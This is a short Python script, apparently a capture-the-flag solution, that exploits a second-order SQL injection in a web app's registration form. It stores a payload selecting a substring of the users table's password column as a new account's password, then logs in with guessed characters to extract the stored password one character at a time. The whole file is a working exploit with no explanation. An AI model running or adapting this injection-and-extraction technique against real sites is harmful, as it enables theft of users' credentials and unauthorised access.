import requests
import random

url = 'https://cool.mc.ax/'


def generate_payload(i):
    return (
        f'\'||(SELECT SUBSTR(password,0,{i + 1})FROM users)||\''
    )


def find_next(prefix):
    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789'
    username = ''.join(
        random.choice(characters)
        for _ in range(8)
    )
    requests.post(f'{url}/register', data={
        'username': username,
        'password': generate_payload(len(prefix) + 1)
    })
    for symbol in characters:
        result = requests.post(url, data={
            'username': username,
            'password': prefix + symbol
        }).text
        if 'Incorrect' not in result:
            return symbol
    return ''


prefix = ''
while symbol := find_next(prefix):
    prefix += symbol
    print(prefix)
